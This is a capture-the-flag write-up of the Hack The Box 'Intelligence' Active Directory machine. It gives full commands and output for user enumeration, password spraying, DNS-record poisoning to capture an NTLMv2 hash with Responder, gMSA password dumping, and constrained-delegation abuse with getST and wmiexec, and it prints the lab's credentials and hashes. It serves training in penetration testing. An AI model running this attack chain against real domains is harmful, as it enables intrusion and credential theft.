# Intelligence - Writeup

## Services
```bash
└─$ nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,696,3268,3269,5985,9389,49666,49691,49692,49701,49713 -oA nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 17:37 EDT
Nmap scan report for 10.129.95.154
Host is up (0.052s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-21 04:37:50Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-07-21T04:39:21+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2023-07-21T04:23:29
|_Not valid after:  2024-07-20T04:23:29
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
696/tcp   filtered rushd
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2023-07-21T04:23:29
|_Not valid after:  2024-07-20T04:23:29
|_ssl-date: 2023-07-21T04:39:21+00:00; +7h00m00s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-07-21T04:39:20+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2023-07-21T04:23:29
|_Not valid after:  2024-07-20T04:23:29
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49666/tcp open     msrpc         Microsoft Windows RPC
49691/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open     msrpc         Microsoft Windows RPC
49701/tcp open     msrpc         Microsoft Windows RPC
49713/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-21T04:38:43
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.46 seconds
```
Big 3 protocols (LDAP,KERBEROS,DNS) leads me to conclude this is a domain controller. The domain name is `intelligence.htb` and the dc is `dc.intelligence.htb`

**Other interesting services:**
* 80 - HTTP IIS 10.0
* 445 - smb
* 5985 - winrm

## DNS
Since DNS has a very small surface to enumerate I will do that first.
I'll be showing examples with nslookup and dig. First I'll attempt a reverse lookup with both:
**dig**
```bash
└─$ dig @$IP -x $IP
;; communications error to 10.129.95.154#53: timed out
```
**nslookup**
```bash
└─$ nslookup
> server 10.129.95.154
Default server: 10.129.95.154
Address: 10.129.95.154#53
> 10.129.95.154
;; communications error to 10.129.95.154#53: timed out
```
If it fails with one, it will fail with both. I'm just using both to get more comfortable with the tools.

We got a domain name and fqdn of the DC so we can try forward dns searches to verify the results of nmap:
**dig**
```bash
└─$ dig @$IP intelligence.htb +short
10.129.95.154

└─$ dig @$IP dc.intelligence.htb +short
10.129.95.154
```
dig can be used with the `+short` options to cut to the chase.
**nslookup**
```bash
> intelligence.htb
;; communications error to 10.129.95.154#53: timed out
Server:         10.129.95.154
Address:        10.129.95.154#53

Name:   intelligence.htb
Address: 10.129.95.154
Name:   intelligence.htb
Address: dead:beef::250
Name:   intelligence.htb
Address: dead:beef::c5fe:fafd:fed5:1fed
```
We have verified both the domain name and fqdn of the DC.
Lastly we'll try for a zone tranfer with the `axfr` flag. A zone transfer is a request for all the DNS records for a DNS zone from one DNS server to another. This is typically done for redundancy and fault tolerance, because it assures that multiple servers have identical DNS records and can step in if one server goes down. It is a noisy request to be done and likely will not succeed, but we may as well try:
```bash
└─$ dig @$IP axfr intelligence.htb

; <<>> DiG 9.18.12-1-Debian <<>> @10.129.95.154 axfr intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
And it failed... That is all the DNS enumeration so we'll move onto SMB.

## SMB
```bash
└─$ smbclient -L //$IP
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.154 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Anonymous login is accepted, however there doesn't appear to be any shares; smbmap returns similar results

## HTTP
Static landing page, with only 2 working hyperlinks that return 2 pdfs. Downloading and looking at the metadata of pdfs is important because at this point we haven't found any usernames and need to enumerate users in the domain. 

The pdf image is arbitrary latin text used often for template websites.

### Enumerate Users
In the metadata of these pdf's there is a "Creator" field with different usernames. 
```bash
┌──(kali㉿kali)-[~/…/intelligence/scripts/file/pdf]
└─$ exiftool 12.15.pdf
ExifTool Version Number         : 12.57
File Name                       : 12.15.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2023:07:20 20:56:10-04:00
File Access Date/Time           : 2023:07:24 06:52:49-04:00
File Inode Change Date/Time     : 2023:07:24 06:53:30-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams

┌──(kali㉿kali)-[~/…/intelligence/scripts/file/pdf]
└─$ exiftool 1.1.pdf
ExifTool Version Number         : 12.57
File Name                       : 1.1.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2023:07:20 20:55:28-04:00
File Access Date/Time           : 2023:07:24 06:52:48-04:00
File Inode Change Date/Time     : 2023:07:24 06:53:30-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```
We can test these usernames with the `kerbrute`:
```bash
└─$ /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d intelligence.htb --dc 10.129.95.154 userEnum.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 07/24/23 - Ronnie Flathers @ropnop

2023/07/24 07:55:55 >  Using KDC(s):
2023/07/24 07:55:55 >   10.129.95.154:88

2023/07/24 07:55:55 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/07/24 07:55:55 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/07/24 07:55:55 >  Done! Tested 2 usernames (2 valid) in 0.057 seconds
``` 
The pdfs followed an obvious naming scheme of `[year]-[month]-[day]-upload.pdf`. We can use this naming scheme to request other pdfs on the server to get more usernames.

I created a quick python script to automate this task, but wget or curl could also be used:
```python
import requests
import re

month = 12
day = 31

for x in range(month+1):
    for y in range(day+1):
        r = requests.get(f"http://10.129.95.154/documents/2020-{x:02d}-{y:02d}-upload.pdf")
        if r.status_code == 200:
            print(f"Found file {x}/{y}")
            with open(f"{x}.{y}.pdf", 'wb') as f:
                f.write(r.content)
        else:
            print('.')
```

After running this script we have 85 pdf files returned. Next we want to get the Creator of all the files into a single file to test for other usernames. We can do this with some bash fu.
```bash

└─$ for i in $(ls *.pdf); do exiftool $i | awk 'FNR == 15 {print $3}' >> users.txt;
done

└─$ cat users.txt | sort | uniq > userenum.txt

┌──(kali㉿kali)-[~/…/intelligence/scripts/file/pdf]
└─$ wc -l userenum.txt
30 userenum.txt
```
So now we have 30 usernames to test for user accounts in the domain.

All of the pdfs are varying sizes, so there could be some important information in the image of the file. To be able to grep these files for text we can use the `pdf2txt` tool.

```bash
└─$ for i in $(ls *.pdf); do pdf2txt $i > $i.txt
```
We can now use grep to look for keywords in these files:
```bash
└─$ grep -ir "password" .
./6.4.pdf.txt:Please login using your username and the default password of:
./6.4.pdf.txt:After logging in please change your password as soon as possible.

┌──(kali㉿kali)-[~/…/intelligence/scripts/file/txt]
└─$ cat 6.4.pdf.txt
New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```
And we find a password that we can use: `NewIntelligenceCorpUser9876`

We can use kerbrute again to check the validity of the usernames we found:
```bash
└─$ /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d intelligence.htb --dc 10.129.95.154 ../pdf/userenum.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 07/24/23 - Ronnie Flathers @ropnop

2023/07/24 12:35:13 >  Using KDC(s):
2023/07/24 12:35:13 >   10.129.95.154:88

2023/07/24 12:35:13 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2023/07/24 12:35:13 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2023/07/24 12:35:13 >  Done! Tested 30 usernames (30 valid) in 0.176 seconds
```

Now we can perform password spraying with the default password we found.
We will be using crackmapexec to perform the password spraying attack:
```bash
└─$ crackmapexec smb $IP -u users.txt -p NewIntelligenceCorpUser9876
SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```
We found the valid creds `Tiffany.Molina:NewIntelligenceCorpUser9876`

Now that we have a valid usrs credentials we can enumerate the smb server found earlier:
```bash
└─$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H $IP
[+] IP: 10.129.95.154:445       Name: intelligence.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```
There is a powershell script in the IT share `downdetector.ps1`
```ps
# Check web server status. Scheduled to run every 5min
# import module to use its cmdlets
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
    try {
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
        if(.StatusCode -ne 200) {
            Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
        }
        } catch {}
 }
```
This script is using the Active Directory module in powershell to interact with the active directory service. It loops over the DNS records that are children of the path specified. It then filters those chidren for those that names starts with web.

After finding these objects, it makes an http request to the URL with the current users credentials for auth.

If the status code is != 200, it sends an email from Ted Graves to Ted graves that the host is down.

So we need to figure out a way to add a DNS record, so that when the script executes it will send an HTTP request to our machine with Ted Graves' credentials.

There is a tool included in krbrelayx called `dnstool.py` that uses LDAP requests to modify DNS records. We can try using `Tiffany.Molina` creds to add our machine to the DNS records.
```bash
└─$ python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -a add -t A -r web-reddish -d 10.10.14.178 10.129.148.50
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

┌──(kali㉿kali)-[/opt/krbrelayx]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.10.14.178] from (UNKNOWN) [10.129.148.50] 64520
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1852
Host: web-reddish
Connection: Keep-Alive
```
We verified that we are getting the HTTP request now we need to setup `responder` to capture the credentials from the script.
```bash
[HTTP] NTLMv2 Client   : 10.129.148.50
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:48eed28929481fcc:B381025D083E9E51DF2DB72FBBAD8328:01010000000000001C87FE112EBFD901251879BE95A4151800000000020008005500310045004E0001001E00570049004E002D0057004F0043004B004C00490058004C004C0041004400040014005500310045004E002E004C004F00430041004C0003003400570049004E002D0057004F0043004B004C00490058004C004C00410044002E005500310045004E002E004C004F00430041004C00050014005500310045004E002E004C004F00430041004C00080030003000000000000000000000000020000089C3056FF0CBA4184BB10DBC3E2DAA4B9E3BEE3B39FF977F4FBDCFD07E3427DD0A001000000000000000000000000000000000000900420048005400540050002F007700650062002D0072006500640064006900730068002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```
This method of authentication is known as `Integrated Windows Authentication with NTLM`. This method uses a challenge response mechanism, allowing users to authenticate without sending plaintet credentials over the network. 

We can crack this hash with hashcat:
```bash
TED.GRAVES::intelligence:48eed28929481fcc:b381025d083e9e51df2db72fbbad8328:01010000000000001c87fe112ebfd901251879be95a4151800000000020008005500310045004e0001001e00570049004e002d0057004f0043004b004c00490058004c004c0041004400040014005500310045004e002e004c004f00430041004c0003003400570049004e002d0057004f0043004b004c00490058004c004c00410044002e005500310045004e002e004c004f00430041004c00050014005500310045004e002e004c004f00430041004c00080030003000000000000000000000000020000089c3056ff0cba4184bb10dbc3e2daa4b9e3bee3b39ff977f4fbdcfd07e3427dd0a001000000000000000000000000000000000000900420048005400540050002f007700650062002d0072006500640064006900730068002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```
## Bloodhound
We are going to use `bloodhound-python` as a collector to dump relationship information about the ad domain:
```bash
└─$ sudo python3 bloodhound.py -c ALL -d intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -dc intelligence.htb -ns $IP
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.203 seconds: Server 10.129.148.50 UDP port 53 answered The DNS operation timed out.; Server 10.129.148.50 UDP port 53 answered The DNS operation timed out.
INFO: Done in 00M 10S

┌──(kali㉿kali)-[/opt/BloodHound.py]
└─$ ls
20230725134931_computers.json   20230725134931_domains.json  20230725134931_groups.json  20230725134931_users.json  bloodhound.py         Dockerfile  README.md
20230725134931_containers.json  20230725134931_gpos.json     20230725134931_ous.json     bloodhound                 createforestcache.py  LICENSE     setup.py
```
We can then import the capture into bloodhound.

Bloodhound shows a path to admin through `ted.graves`. `ted.graves -> svc_int$ -> Admin`. We are able to escalate these privileges, because ted is a member of the `itsupport` group, the `svc_int` account is a Group managed service account, and the itsupport group is able to retreive the GMSA (Group Managed Service Account) password. 

After retreiving the password for the service account, we can use it in a **Silver Ticket attack**.

### Silver Ticket
A silver ticket attack is when an attacker forges a TGS ticket and then sends it to that service. An attacker is able to forge TGS tickets when they have the secret key or NTLM password of the service account the TGS is for. TGS are usually granted by:
- User requests TGS for service from KDC
- KDC encrypts the TGS with the services secret key and sends it to the user
- The user presents the service with the TGS
- The service decrypts the TGS with its secret key and then determines what access the user gets

Now if the user knows the secret key of the service account they can create a TGS and include whichever rights they wish, so that when the service decrypts the TGS they grant the rights defined.


The `svc_int$` account does not have an SPN for a service, so this isn't as straight forward of an approach as crafting a silver ticket and sending it to the corresponding `svc_int$` service. The `svc_int$` account is **Allowed to Delegate** for the service `WWW/dc.intelligence.htb`. The account has contrained delegation meaning that it can impersonate any user for specific services, like WWW. With this enabled we can make a silver ticket with `svc_int$` ntlm hash and impersonate the `Administrator` account to get own the domain controller.

Before we get into the tools used for that attack I want to cover another way to view the dumped information from a collector like `sharphound`, `bloodhound-python`, or `ldapdomaindump`

Using the `ldapdomaindump.py` tool we can get the dump of the domain output into a grepable format allowing us to look for particular traits, like DELEGATION:
```bash
└─$ grep -i "DELEGATION" *.grep
domain_computers.grep:svc_int   svc_int$        svc_int.intelligence.htb                                07/27/23 05:18:12   WORKSTATION_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION     04/19/21 00:49:58       S-1-5-21-4210132550-3389855604-3437519686-1144
domain_computers.grep:DC        DC$     dc.intelligence.htb     Windows Server 2019 Datacenter          10.0 (17763)07/27/23 19:21:16       SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION    04/19/21 00:42:41       S-1-5-21-4210132550-3389855604-3437519686-1000
```
This output shows `TRUSTED_TO_AUTH_FOR_DELEGATION` for the service account which means its setup for delegation and `TRUSTERD_FOR_DELEGATION` for the server means its set with delegation. We don't however get the SPN for this service, so we need to use another tool to retreive that.

`finddeligation.py` - another impacket py script thats used to get delegation relationships in a domain
```bash
└─$ python3 /usr/share/doc/python3-impacket/examples/findDelegation.py -dc-ip $IP intelligence.htb/ted.graves:Mr.Ted
dy
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName  AccountType                          DelegationType                      DelegationRightsTo
-----------  -----------------------------------  ----------------------------------  -----------------------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb
```

We have a clear path to Admin, now we just need to get the service account password and create the **silver ticket** with Administrator impersonation.

## PrivEsc - Root

### Read GMSA account password 
Use `gMSADumper.py` script to read the service accounts NTLM hash.
```bash
└─$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::fb49fcd5ffc6fefa70503e08c9cd8261
svc_int$:aes256-cts-hmac-sha1-96:7780ba9c60cac7b51f89a4faee199cb103b350082fdac5f7c412fd024d0fc5e6
svc_int$:aes128-cts-hmac-sha1-96:de0b7110639ccbcd2cf195840d6b3ca7
```
We have the service accounts password, now we'll use it to get a silver ticket impersonating Admin:
```
┌──(kali㉿kali)-[~/htb/box/intelligence]
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes fb49fcd5ffc6fefa70503e08c9cd8261:fb49fcd5ffc6fefa70503e08c9cd8261 intelligence.htb/svc_int$
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

┌──(kali㉿kali)-[~/htb/box/intelligence]
└─$ sudo ntpdate $IP
[sudo] password for kali:
2023-07-27 21:33:30.458263 (-0400) +25200.995270 +/- 0.027106 10.129.143.57 s1 no-leap
CLOCK: time stepped by 25200.995270

┌──(kali㉿kali)-[~/htb/box/intelligence]
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes fb49fcd5ffc6fefa70503e08c9cd8261:fb49fcd5ffc6fefa70503e08c9cd8261 intelligence.htb/svc_int$
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
The clock was off between the dc and my machine so I used ntpdate to align the clocks and then get the Silver Ticket. The silver ticket is saved in Administrator.ccache

Use the wmiexec.py script to get a shell as Admin on the domain controller. 
```bash
┌──(kali㉿kali)-[~/htb/box/intelligence]
└─$ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass Administrator@dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator
```
By using the `-k` flag the script looks for the ticket in the `KRB5CCNAME` variable, which can either be an environement variable or defined during inline.
```bash
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line
```
*-k flag definition*

We now own the domain controller and can grab the admin flag.
